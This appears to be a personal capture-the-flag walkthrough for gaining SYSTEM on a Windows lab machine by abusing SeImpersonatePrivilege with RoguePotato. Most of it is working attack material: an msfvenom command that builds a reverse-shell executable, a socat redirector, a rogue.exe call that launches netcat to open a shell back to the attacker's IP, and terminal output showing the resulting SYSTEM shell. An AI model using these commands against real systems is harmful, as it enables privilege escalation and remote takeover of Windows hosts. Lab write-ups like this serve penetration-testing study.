## how to exploit SeImpersonatePrivilege using a juicePotato binary

with roguepotato binary we can use get with this approach here, just make this binary is present on the target machine and a location that is writable oky hackerB0y.

## requirements 
1. we need to generate a binary on our machine with msfvenom
```
command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe
```
```
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/REMOTE]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe                           
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe

```

2.  we need to run this command on our machine

    **command**: sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
```
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/REMOTE]
└─$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
[sudo] password for alienx: 
2024/04/13 09:09:26 socat[32866] E read(5, 0x5608bdf2e000, 8192): Connection reset by peer
2024/04/13 09:09:26 socat[32867] E read(5, 0x5608bdf2e000, 8192): Connection reset by peer
2024/04/13 09:10:21 socat[32870] E read(5, 0x5608bdf2e000, 8192): Connection reset by peer
2024/04/13 09:11:28 socat[32948] E read(5, 0x5608bdf2e000, 8192): Connection reset by peer

```

3.  we need to run this command on our target machine
    command: rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999  
```
C:\Users\Public\desktop>rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999                                                                                                                      
rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999                                                                                                                                              
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:104 bytes
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[*] Client connected!                                      
[+] Got SYSTEM Token!!!                                    
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe
[+] RoguePotato gave you the SYSTEM powerz :D

```

4. set a netcat listerner and wait for response
```
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/REMOTE]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.29] from (UNKNOWN) [10.10.10.180] 49770
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Public\desktop>whoami
whoami
nt authority\system

C:\Users\Public\desktop>


```

## WERE DONE WITH ROGUEPOTATO BINARY HOPE U ENJOYED THE SHELL
